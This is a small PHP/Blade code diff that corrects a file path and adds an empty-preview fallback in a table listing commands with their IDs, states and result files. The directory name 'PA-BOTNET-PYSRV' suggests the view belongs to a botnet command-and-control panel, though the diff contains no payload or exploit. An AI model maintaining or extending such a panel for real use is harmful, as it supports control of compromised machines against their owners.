@@ -459,13 +459,16 @@
                                                             $resultPreview = '';
                                                         }
                                                         else {
-                                                            $filePath = $path."/PA-BOTNET-PYSRV/{$command->result}";
+                                                            $filePath = $path."PA-BOTNET-PYSRV/{$command->result}";
                                                             if (!empty($filePath) && file_exists($filePath)) {
                                                                 $fileContent = file_get_contents($filePath);
                                                                 $resultPreview = substr($fileContent, 0, 30) . (strlen($fileContent) > 30 ? '...' : '');
                                                             }
+                                                            else {
+                                                                $resultPreview = '';
+                                                            }
                                                         }
-                                                    @endphp  
+                                                    @endphp
                                                     <tr>
                                                         <th scope="row">{{ $command->id }}</th>
                                                         <td>{{ $command->state }}</td>
